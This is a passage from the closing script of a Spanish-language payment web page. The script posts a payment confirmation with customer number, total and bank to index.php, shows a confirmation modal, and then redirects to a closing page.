        text.textContent = 'Verificando...';

        fetch('index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'confirm_payment',
                nic: nicParam,
                total: document.getElementById('displayTotal').textContent || totalParam,
                banco: bancoParam
            })
        })
        .then(() => {
            setTimeout(() => {
                spinner.style.display = 'none';
                icon.style.display = 'inline-block';
                text.textContent = '¡Pago Registrado!';
                document.getElementById('modalConfirmacion').style.display = 'flex';
            }, 1000);
        })
        .catch(() => {
            setTimeout(() => {
                spinner.style.display = 'none';
                icon.style.display = 'inline-block';
                document.getElementById('modalConfirmacion').style.display = 'flex';
            }, 1000);
        });
    }

    function finalizarProceso() {
        window.location.href = '../../close.html';
    }
</script>

</body>
</html>
